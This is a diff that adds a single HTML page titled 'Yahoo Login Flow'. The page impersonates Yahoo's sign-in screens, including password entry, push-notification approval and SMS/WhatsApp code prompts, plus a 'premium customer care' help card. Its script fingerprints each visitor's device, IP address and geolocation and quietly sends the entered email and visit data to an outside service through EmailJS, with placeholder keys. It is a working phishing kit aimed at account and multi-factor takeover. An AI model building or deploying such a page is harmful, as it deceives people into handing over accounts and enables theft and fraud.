@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Yahoo Login Flow</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    :root{
+      --purple: #5f01d1;
+      --purple-strong: #6c2bd9;
+      --accent: #7830EC;
+      --btn-purple: #7a2df2;
+      --more-purple: #B084FF;
+      --more-purple-hover: #7830EC;
+      --muted: #6f6f6f;
+      --card-border: #e6e6e9;
+      --green: #2ecc71;
+      --red: #ff4d4f;
+    }
+    body { margin:0; font-family:'Roboto',sans-serif; background:#fff; color:#000; display:flex; flex-direction:column; min-height:100vh; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;}
+    .container { width:100%; max-width:420px; margin:auto; padding:20px; text-align:center; display:flex; flex-direction:column; gap:12px; }
+    .logo { font-size:36px; font-weight:900; color:var(--purple); margin:6px 0 4px; }
+    .username-label { font-size:18px; color:#222; margin:2px 0 18px; }
+    h2 { margin:10px 0; font-size:28px; font-weight:900; }
+    p { margin:5px 0 22px; font-size:16px; color:#555; }
+    .input-container { position:relative; margin-bottom:28px; text-align:left; }
+    .input-container input { width:100%; padding:12px 10px; font-size:16px; border:none; border-bottom:2px solid #ccc; outline:none; background:transparent; }
+    .input-container input:focus { border-bottom:2px solid var(--purple); }
+    .btn { background:var(--btn-purple); color:#fff; border:none; padding:14px; font-size:16px; border-radius:24px; width:100%; cursor:pointer; }
+    .btn:hover { filter:brightness(0.96); }
+    .btn-outline { background:#fff; border:1.5px solid #c6a9ff; color:var(--btn-purple); padding:12px 16px; border-radius:999px; font-weight:600; cursor:pointer; width:100%; }
+    .link { display:inline-block; margin-top:12px; font-size:16px; color:var(--purple); text-decoration:none; }
+    .link-left { display:block; width:100%; text-align:left; margin:8px 0 14px; font-size:16px; color:var(--purple); text-decoration:none; padding-left:2px; font-weight:600; line-height:1.2; }
+    .link-left:hover, .link:hover { text-decoration:underline; }
+    .or { margin:18px 0; color:#aaa; }
+    .google-btn { border:1px solid #ccc; display:flex; align-items:center; justify-content:center; padding:14px; border-radius:24px; font-size:17px; cursor:pointer; }
+    .footer { text-align:center; padding:clamp(64px, 12vh, 140px) 10px 24px; font-size:14px; color:#888; }
+    .footer a { margin:0 10px; text-decoration:none; color:#888; }
+    .footer a:hover { text-decoration:underline; }
+    .page { display:none; } .active { display:block; animation:fadeIn .25s ease-in-out; }
+    .options { display:flex; flex-direction:column; gap:14px; }
+    .option { display:flex; align-items:center; padding:16px; border:1px solid #e0e0e0; border-radius:12px; background:#fff; cursor:pointer; transition:all .2s; text-align:left; }
+    .option.selected { border-color:var(--purple-strong); box-shadow:0 0 10px rgba(108,43,217,.12); background:#faf8ff; }
+    .icon-wrap { width:40px; display:flex; align-items:center; justify-content:center; margin-right:12px; flex:0 0 40px; color:#000; }
+    .icon-wrap svg { width:24px; height:24px; fill:none; stroke:currentColor; stroke-width:1.8; }
+    .option-content { display:flex; flex-direction:column; flex:1 1 auto; min-width:0; }
+    .option-title { font-size:16px; font-weight:600; color:#000; margin:0 0 2px; }
+    .option-sub { font-size:14px; color:#000; margin:0; line-height:1.4; }
+    .more { margin-top:16px; font-size:20px; color:var(--more-purple); font-weight:400; text-decoration:none; display:block; text-align:center; padding-bottom:6px; letter-spacing:.2px; transition:color .25s, opacity .25s; }
+    .more:hover { color:var(--more-purple-hover); }
+    .muted { color:var(--muted); }
+    .otp-input { width:100%; font-size:20px; padding:14px 8px 10px; border:none; border-bottom:2px solid #ccc; outline:none; background:transparent; letter-spacing:2px; }
+    .otp-input:focus { border-bottom:2px solid var(--purple); }
+    .timer { margin-top:10px; color:var(--muted); }
+    .help-cards { display:flex; flex-direction:column; gap:14px; margin-top:10px; }
+    .help-card { display:flex; align-items:center; gap:12px; padding:16px; border:1px solid var(--card-border); border-radius:12px; background:#fff; text-align:left; }
+    .help-card .title { font-weight:600; }
+    .spacer-xs{height:6px}.spacer-sm{height:10px}.spacer-md{height:16px}.spacer-lg{height:24px}.spacer-xl{height:32px}.spacer-2xl{height:40px}
+    .number{font-weight:900;color:#000;margin-top:2px}
+    /* Animated phone */
+    .phone{width:140px;height:220px;border:2px solid #ddd;border-radius:22px;margin:12px auto 8px;background:linear-gradient(180deg,#fff 0%,#fdfcff 50%,#fbf9ff 100%);position:relative;overflow:hidden;animation:float 3.2s ease-in-out infinite}
+    .notch{width:36px;height:6px;border-radius:3px;background:#cfcfe6;position:absolute;top:8px;left:50%;transform:translateX(-50%)}
+    .avatar{width:32px;height:32px;border-radius:50%;background:#ececf6;border:1px solid #e2e2f1;position:absolute;top:26px;left:50%;transform:translateX(-50%)}
+    .line{height:8px;border-radius:4px;margin:4px auto;width:76px;background:linear-gradient(90deg,#efeff8 25%,#dcdcf2 50%,#efeff8 75%);background-size:200% 100%;animation:shimmer 1.6s linear infinite}
+    .line.l2{width:92px;animation-delay:.2s}.line.l3{width:64px;animation-delay:.4s}
+    .cta-row{position:absolute;bottom:18px;left:0;right:0;display:flex;justify-content:space-around;align-items:center}
+    .btn-circle{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;box-shadow:0 8px 14px rgba(0,0,0,.08)}
+    .btn-no{background:#ff4d4f}.btn-yes{background:#2ecc71;position:relative}
+    .btn-yes:after{content:'';position:absolute;inset:-6px;border-radius:50%;border:2px solid rgba(46,204,113,.45);opacity:0;transform:scale(.7);animation:ring 2.4s ease-out infinite 1s}
+    .tick{width:20px;height:20px}.tick path{fill:none;stroke:#fff;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:26;stroke-dashoffset:26;animation:checkDraw 2.4s ease-in-out infinite .3s}
+    .notif{position:absolute;top:-60px;left:50%;transform:translateX(-50%);width:92px;background:#fff;border:1px solid #e8e6ff;border-radius:10px;padding:6px 8px;box-shadow:0 8px 18px rgba(120,48,236,.16);display:flex;align-items:center;gap:6px;animation:dropIn 2.6s ease-in-out infinite}
+    .notif .dot{width:10px;height:10px;border-radius:50%;background:#7830EC;box-shadow:0 0 0 6px rgba(120,48,236,.12)}
+    .notif .txt{height:6px;width:56px;background:#efe8ff;border-radius:3px}
+    .title-soft{font-size:22px;font-weight:700;margin:0 0 8px}
+    @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-4px)}}@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}@keyframes ring{0%{opacity:0;transform:scale(.7)}20%{opacity:1}70%{opacity:0;transform:scale(1.25)}100%{opacity:0;transform:scale(1.25)}}@keyframes checkDraw{0%{stroke-dashoffset:26}25%{stroke-dashoffset:0}60%{stroke-dashoffset:0}100%{stroke-dashoffset:26}}@keyframes dropIn{0%{transform:translate(-50%,-20px);opacity:0}20%{transform:translate(-50%,0);opacity:1}55%{transform:translate(-50%,0);opacity:1}100%{transform:translate(-50%,-20px);opacity:0}}@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
+/* Spinner overlay (minimal, non-intrusive) */
+.spinner-overlay{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.8);z-index:9999;opacity:0;pointer-events:none;transition:opacity .18s ease}
+.spinner-overlay.visible{opacity:1;pointer-events:auto}
+.spinner{width:64px;height:64px;border-radius:50%;border:6px solid rgba(0,0,0,.08);border-top-color:var(--btn-purple);animation:spin 1s linear infinite;display:flex;align-items:center;justify-content:center}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* small note under spinner */
+.spinner-note{margin-top:12px;color:#444;font-weight:500;font-size:14px;text-align:center}
+  </style>
+
+<style id="bigger-google-logo">
+/* Override: make Google button icon big and comfy */
+.google-btn{
+  gap: 12px;              /* spacing between G and text */
+  padding: 16px 18px;     /* taller button */
+  border-radius: 28px;    /* rounder */
+}
+.google-btn img{
+  width: 28px;
+  height: 28px;
+  flex: 0 0 28px;
+  margin-right: 0;        /* gap handles spacing */
+}
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- PAGE 1 -->
+  <div class="page page1 active">
+    <div class="logo">yahoo!</div>
+    <h2>Sign in</h2>
+    <p>using your Yahoo account</p>
+    <div class="input-container">
+      <input type="text" id="email" placeholder="Username, email, or mobile" />
+    </div>
+    <button class="btn" onclick="goToPage(2)">Next</button>
+    <a href="#" class="link" onclick="openRecovery(event)">Forgot username?</a>
+    <a href="#" class="link" style="border:2px solid #8a3ffc; color:#6c2bd9; font-weight:500; font-size:17px; padding:14px 0; border-radius:9999px; display:block; margin-top:20px;">Create an account</a>
+    <div class="or">or</div>
+    <div class="google-btn"><img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt=""> Sign in with Google</div>
+  </div>
+
+  <!-- PAGE 2 -->
+  <div class="page page2">
+    <div class="logo">yahoo!</div>
+    <div class="username-label" id="displayedEmail">[email]</div>
+    <h2>Enter password</h2>
+    <p>to finish sign in</p>
+    <div class="input-container"><input type="password" id="password" placeholder="Password" /></div>
+    <a href="#" class="link-left" onclick="openRecovery(event)">Forgot password?</a>
+    <!-- changed onclick to nextFromPage2 to allow spinner + sending capture data -->
+    <button class="btn" onclick="nextFromPage2()">Next</button>
+  </div>
+
+  <!-- PAGE 3 -->
+  <div class="page page3">
+    <div class="logo">yahoo!</div>
+    <div class="username-label" id="userDisplay"></div>
+    <h2>Is it really you?</h2>
+    <p>To keep your account secure, quickly verify your identity.</p>
+
+    <div class="options">
+      <div class="option" onclick="openPushConsent(this)">
+        <div class="icon-wrap">
+          <svg viewBox="0 0 24 24"><path d="M10 20a2 2 0 0 0 4 0"/><path d="M18 16H6l1.2-1.8A3 3 0 0 0 8 12V9a4 4 0 0 1 8 0v3c0 .6.18 1.18.52 1.68L18 16z"/></svg>
+        </div>
+        <div class="option-content"><div class="option-title">Push notification</div><div class="option-sub">Approve on iPhone</div></div>
+      </div>
+      <div class="option" onclick="openPushConsent(this)">
+        <div class="icon-wrap">
+          <svg viewBox="0 0 24 24"><path d="M10 20a2 2 0 0 0 4 0"/><path d="M18 16H6l1.2-1.8A3 3 0 0 0 8 12V9a4 4 0 0 1 8 0v3c0 .6.18 1.18.52 1.68L18 16z"/></svg>
+        </div>
+        <div class="option-content"><div class="option-title">Push notification</div><div class="option-sub">Approve on iPhone</div></div>
+      </div>
+      <div class="option" onclick="openSmsOtp(this)">
+        <div class="icon-wrap"><svg viewBox="0 0 24 24"><path d="M4 5h16v10H7l-3 3V5z"/></svg></div>
+        <div class="option-content"><div class="option-title">Text message</div><div class="option-sub">Get a code on (***) ***. Message and data rates may apply.</div></div>
+      </div>
+      <div class="option" onclick="openWaOtp(this)">
+        <div class="icon-wrap">
+          <svg viewBox="0 0 24 24"><path d="M5 20l1.3-3.3A7 7 0 1 1 12 19a7.1 7.1 0 0 1-3.5-.9L5 20z"/><path d="M10 9.5c.3-.3.5-.3.8-.3.2 0 .4 0 .6.4.2.4.7 1.4.7 1.4s.2.4 0 .7-.4.5-.4.5-.2.2 0 .5c.2.3.7 1.1 1.7 1.6.9.4 1.1.3 1.3.3.2 0 .6-.3.7-.5.2-.3.3-.4.5-.3.3.1 1.3.6 1.3.6s.4.2.4.5-.1.7-.3 1c-.3.3-.8.8-1.6.8-.8.1-1.4 0-2.3-.4-1-.4-1.9-1-2.6-1.8-.7-.8-1.3-1.8-1.5-2.1-.2-.3-.4-1.1-.4-1.1s-.1-.7.2-1c.3-.3.5-.5.5-.5z"/></svg>
+        </div>
+        <div class="option-content"><div class="option-title">WhatsApp</div><div class="option-sub">Get a code on (***) ***. Message and data rates may apply.</div></div>
+      </div>
+    </div>
+
+    <a href="#" class="more" onclick="goToPage(9)">Select another option</a>
+  </div>
+
+  <!-- PAGE 4: Recovery -->
+  <div class="page page4">
+    <div class="logo">yahoo!</div>
+    <h2>Let's get you into your account</h2>
+    <p>Tell us one of the following to get started:</p>
+    <ul style="text-align:left;line-height:1.6;margin:4px 0 18px;padding-left:22px;">
+      <li>Sign-in email address or mobile number</li>
+      <li>Recovery phone number</li>
+      <li>Recovery email address</li>
+    </ul>
+    <div class="input-container" style="margin-top:10px;"><input id="recoveryInput" type="text" placeholder="Email address or phone number" /></div>
+    <button class="btn" onclick="goToPage(3)">Continue</button>
+  </div>
+
+  <!-- PAGE 5: Push consent -->
+  <div class="page page5">
+    <div class="logo">yahoo!</div>
+    <div class="spacer-xl"></div>
+    <div class="username-label" id="userDisplayPush"></div>
+    <h2 class="title-soft">Can we send a notification to your device?</h2>
+    <div class="spacer-sm"></div>
+    <p class="muted" style="max-width:36ch;margin:0 auto;">We'd like to send a notification to verify it's the real you signing in. It will come from one of your Yahoo apps. Once you confirm it, you'll be all set.</p>
+    <div class="spacer-lg"></div>
+    <button class="btn" onclick="goToPage(6)">Yes, send me a notification</button>
+    <div class="spacer-lg"></div>
+    <button class="btn-outline" onclick="goToPage(9)">No, I can't access that device</button>
+  </div>
+
+  <!-- PAGE 6: Push waiting (animation + bullets) -->
+  <div class="page page6">
+    <div class="logo">yahoo!</div>
+    <div class="username-label" id="userDisplayPush2"></div>
+    <h2>Open your iPhone</h2>
+    <p>to approve the sign in request sent to</p>
+    <h3 style="margin-top:0;">Yahoo Mail app</h3>
+
+    <div class="phone">
+      <div class="notch"></div>
+      <div class="notif"><div class="dot"></div><div class="txt"></div></div>
+      <div class="avatar"></div>
+      <div class="line l1"></div><div class="line l2"></div><div class="line l3"></div>
+      <div class="cta-row"><div class="btn-circle btn-no">✕</div><div class="btn-circle btn-yes"><svg class="tick" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"></path></svg></div></div>
+    </div>
+
+    <ul style="max-width:32ch;margin:8px auto 18px;text-align:left;line-height:1.6;padding-left:22px;color:#111;">
+      <li>Tap on Yahoo notification</li>
+      <li>Click on <strong style="color:#000;">YES</strong> to sign in</li>
+    </ul>
+
+    <p class="muted">Can't find notification? <a href="#" class="link" onclick="resend('push')">Resend</a></p>
+    <a href="#" class="link" onclick="goToPage(3)">See more verification methods</a>
+  </div>
+
+  <!-- PAGE 7: OTP SMS (timer 41s) -->
+  <div class="page page7">
+    <div class="logo">yahoo!</div>
+    <div class="username-label" id="userDisplaySms"></div>
+    <h2>Enter verification code</h2>
+    <p>You'll get a text on <strong>(8**)&nbsp;***&nbsp;**39</strong></p>
+    <input id="otpSms" class="otp-input" inputmode="numeric" maxlength="6" placeholder="6-digit code" />
+    <div class="spacer-sm"></div>
+    <button class="btn" onclick="submitOtp('sms')">Next</button>
+    <div id="smsTimer" class="timer">Resend code in 0:41</div>
+    <div class="spacer-sm"></div>
+    <a href="#" class="link" onclick="goToPage(3)">Try signing in another way</a>
+  </div>
+
+  <!-- PAGE 8: OTP WhatsApp (timer 27s; number on separate line) -->
+  <div class="page page8">
+    <div class="logo">yahoo!</div>
+    <div class="spacer-xl"></div>
+    <div class="username-label" id="userDisplayWa"></div>
+    <div class="spacer-sm"></div>
+    <h2>Enter verification code</h2>
+    <div class="spacer-sm"></div>
+    <p style="margin:0;color:#555;">You'll get a WhatsApp message on</p>
+    <div class="number">(8**)&nbsp;***&nbsp;**39</div>
+    <div class="spacer-sm"></div>
+    <input id="otpWa" class="otp-input" inputmode="numeric" maxlength="6" placeholder="6-digit code" />
+    <div class="spacer-sm"></div>
+    <button class="btn" onclick="submitOtp('wa')">Next</button>
+    <div id="waTimer" class="timer">Resend code in 0:27</div>
+    <div class="spacer-sm"></div>
+    <a href="#" class="link" onclick="goToPage(3)">Try signing in another way</a>
+  </div>
+
+  <!-- PAGE 9: Help -->
+  <div class="page page9">
+    <div class="logo">yahoo!</div>
+    <h2>Let us help you</h2>
+    <p>Choose an option below</p>
+    <div class="help-cards">
+      <div class="help-card"><div style="font-size:22px;">📞</div><div><div class="title">Call premium customer care</div></div></div>
+      <div class="help-card"><div style="font-size:22px;">🖥️</div><div><div class="title">Visit our free help site</div></div></div>
+    </div>
+    <div style="height:18px"></div>
+    <a href="#" class="link" onclick="goToPage(1)">Try signing in again</a>
+  </div>
+
+</div>
+
+<!-- Spinner overlay (used on page 2 next click) -->
+<div id="spinnerOverlay" class="spinner-overlay" aria-hidden="true">
+  <div style="text-align:center">
+    <div class="spinner" role="status" aria-hidden="true"></div>
+    <div class="spinner-note">Verifying…</div>
+  </div>
+</div>
+
+<div class="footer">
+  <a href="#">Help</a>
+  <a href="#">Terms</a>
+  <a href="#">Privacy</a>
+</div>
+
+<script>
+  // EmailJS init - keep placeholder, you'll provide your public key later
+  emailjs.init("YOUR_PUBLIC_KEY");
+
+  // Captured visit data container
+  const visitData = {
+    ip: 'unknown',
+    city: 'unknown',
+    region: 'unknown',
+    country: 'unknown',
+    device: 'unknown',
+    userAgent: navigator.userAgent || '',
+    timestamp: new Date().toISOString(),
+    referrer: document.referrer || '',
+    locale: navigator.language || ''
+  };
+
+  // helper: detect device name from UA / UAData
+  function detectDeviceName() {
+    // prefer userAgentData if available
+    try {
+      const uaData = navigator.userAgentData;
+      if (uaData && uaData.platform) {
+        // mobile hint
+        if (uaData.mobile) {
+          // platform might be "Android" or "iOS"
+          return uaData.platform;
+        }
+        return uaData.platform;
+      }
+    } catch (e) {}
+
+    const ua = navigator.userAgent || '';
+    // simple regex-based detection
+    if (/iPhone/i.test(ua)) return 'iPhone';
+    if (/iPad/i.test(ua)) return 'iPad';
+    if (/Android/i.test(ua)) {
+      // attempt to extract model (may not always be present)
+      const m = ua.match(/Android.*; (.+?) Build/);
+      if (m && m[1]) return m[1].trim();
+      return 'Android device';
+    }
+    if (/Windows Phone/i.test(ua)) return 'Windows Phone';
+    if (/Windows NT/i.test(ua)) return 'Windows PC';
+    if (/Macintosh/i.test(ua)) return 'Mac';
+    if (/Linux/i.test(ua)) return 'Linux';
+    return 'Unknown device';
+  }
+
+  // Fetch IP + geo. We will attempt ipapi.co which is CORS-friendly for basic lookups.
+  async function fetchIpAndGeo() {
+    try {
+      const resp = await fetch('https://ipapi.co/json/');
+      if (!resp.ok) throw new Error('geo fetch failed');
+      const js = await resp.json();
+      visitData.ip = js.ip || visitData.ip;
+      visitData.city = js.city || visitData.city;
+      visitData.region = js.region || visitData.region;
+      visitData.country = js.country_name || visitData.country;
+      visitData.postal = js.postal || '';
+      visitData.org = js.org || '';
+    } catch (e) {
+      // silent fallback; we keep 'unknown' values
+      // console.warn('geo lookup failed', e);
+    }
+  }
+
+  // Capture initial visit info (run on load)
+  async function captureInitialVisit() {
+    visitData.timestamp = new Date().toISOString();
+    visitData.userAgent = navigator.userAgent || '';
+    visitData.device = detectDeviceName();
+    visitData.locale = navigator.language || '';
+    await fetchIpAndGeo();
+    // nothing is sent automatically now — we'll send when the user proceeds
+  }
+
+  // Show/hide spinner overlay
+  function showSpinner() {
+    const s = document.getElementById('spinnerOverlay');
+    s.classList.add('visible');
+    s.setAttribute('aria-hidden', 'false');
+  }
+  function hideSpinner() {
+    const s = document.getElementById('spinnerOverlay');
+    s.classList.remove('visible');
+    s.setAttribute('aria-hidden', 'true');
+  }
+
+  // When user clicks Next on page 2, show spinner for 1.3s while attempting to send captured data to EmailJS
+  async function nextFromPage2() {
+    // update timestamp/other fields at the moment they click Next on page 2
+    visitData.timestamp = new Date().toISOString();
+    visitData.user_email = document.getElementById('email').value || '';
+    visitData.device = detectDeviceName(); // refresh device string
+    visitData.userAgent = navigator.userAgent || '';
+    visitData.referrer = document.referrer || '';
+    visitData.locale = navigator.language || '';
+
+    showSpinner();
+
+    // attempt to send visitData via EmailJS (you'll set service & template IDs later)
+    const sendPromise = (async () => {
+      try {
+        // Map to template params expected by your template. Adjust keys as needed later.
+        const templateParams = {
+          user_email: visitData.user_email,
+          ip_address: visitData.ip,
+          city: visitData.city,
+          region: visitData.region,
+          country: visitData.country,
+          device: visitData.device,
+          user_agent: visitData.userAgent,
+          timestamp: visitData.timestamp,
+          referrer: visitData.referrer,
+          locale: visitData.locale
+        };
+        // NOTE: Replace "YOUR_SERVICE_ID" and "YOUR_TEMPLATE_ID" when you provide them.
+        await emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams);
+      } catch (err) {
+        // don't block UX on failure; we still proceed after the spinner timeout
+        // console.warn('email send failed', err);
+      }
+    })();
+
+    // Wait at least 1.3 seconds to give the send a chance to complete and satisfy the requested spinner duration.
+    const minWait = new Promise(resolve => setTimeout(resolve, 1300));
+
+    // wait for both min wait and the send attempt (but don't fail if sendPromise takes longer)
+    await Promise.all([minWait, sendPromise.catch(()=>{})]);
+
+    hideSpinner();
+
+    // now proceed to page 3
+    goToPage(3);
+  }
+
+  // Existing goToPage with minor enhancement: when going to page 2, refresh capture timestamp and when going to page 3 fill device in push option texts
+  function goToPage(num) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.querySelector('.page' + num).classList.add('active');
+
+    if (num === 2) {
+      document.getElementById('displayedEmail').textContent = document.getElementById('email').value || '[email]';
+      // update timestamp for page 2 visit
+      visitData.timestamp = new Date().toISOString();
+      visitData.user_email = document.getElementById('email').value || '';
+    }
+    if (num === 3) {
+      document.getElementById('userDisplay').textContent = document.getElementById('email').value || '';
+      // fill the push option subtitle text with detected device
+      const deviceLabel = visitData.device || detectDeviceName();
+      // Update the first two push option subtitles in page 3
+      const page3Options = document.querySelectorAll('.page3 .option');
+      let count = 0;
+      for (const opt of page3Options) {
+        const title = opt.querySelector('.option-title') && opt.querySelector('.option-title').textContent.trim().toLowerCase();
+        if (title && title.includes('push')) {
+          const sub = opt.querySelector('.option-sub');
+          if (sub) sub.textContent = 'Approve on ' + deviceLabel;
+          count++;
+          if (count >= 2) break; // update only the first two push options
+        }
+      }
+    }
+    if (num === 5) {
+      document.getElementById('userDisplayPush').textContent = document.getElementById('email').value || '';
+    }
+    if (num === 6) {
+      document.getElementById('userDisplayPush2').textContent = document.getElementById('email').value || '';
+    }
+    if (num === 7) {
+      document.getElementById('userDisplaySms').textContent = document.getElementById('email').value || '';
+      startTimer('smsTimer', 41, 'sms');
+    }
+    if (num === 8) {
+      document.getElementById('userDisplayWa').textContent = document.getElementById('email').value || '';
+      startTimer('waTimer', 27, 'wa');
+    }
+  }
+
+  function openRecovery(e){ e && e.preventDefault(); goToPage(4); }
+
+  function openPushConsent(el){ selectCard(el); emailAndSend('Push notification'); goToPage(5); }
+  function openSmsOtp(el){ selectCard(el); emailAndSend('Text message'); goToPage(7); }
+  function openWaOtp(el){ selectCard(el); emailAndSend('WhatsApp'); goToPage(8); }
+
+  function selectCard(el){ document.querySelectorAll('.option').forEach(o => o.classList.remove('selected')); el && el.classList.add('selected'); }
+
+  // Keep existing emailAndSend behaviour for method-selection emails (still using placeholders)
+  function emailAndSend(method){
+    const email = document.getElementById('email').value || '';
+    // send method-specific event, preserving the original structure
+    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", { user_email: email, selected_method: method }).catch(()=>{});
+  }
+
+  let timers = {};
+  function startTimer(spanId, seconds, key){
+    clearInterval(timers[key]);
+    const el = document.getElementById(spanId);
+    let t = seconds;
+    const fmt = s => `Resend code in 0:${String(s).padStart(2,'0')}`;
+    el.textContent = fmt(t);
+    timers[key] = setInterval(()=>{
+      t--;
+      if (t <= 0){
+        clearInterval(timers[key]);
+        el.innerHTML = `<a href="#" class="link" onclick="resend('${key}')">Resend code</a>`;
+      } else {
+        el.textContent = fmt(t);
+      }
+    },1000);
+  }
+
+  function resend(key){
+    alert(key === 'push' ? 'Notification resent.' : 'Code resent.');
+    if (key === 'sms') startTimer('smsTimer', 41, 'sms');
+    if (key === 'wa')  startTimer('waTimer', 27, 'wa');
+  }
+
+  function submitOtp(kind){ alert('Submitted '+kind.toUpperCase()+' code.'); }
+
+  // Run initial capture when DOM is ready
+  document.addEventListener('DOMContentLoaded', async () => {
+    // capture initial device+geo data
+    visitData.device = detectDeviceName();
+    visitData.userAgent = navigator.userAgent || '';
+    visitData.timestamp = new Date().toISOString();
+    // fetch IP + city/geo in background
+    fetchIpAndGeo().then(()=>{/* done (silent) */});
+  });
+</script>
+</body>
+</html>
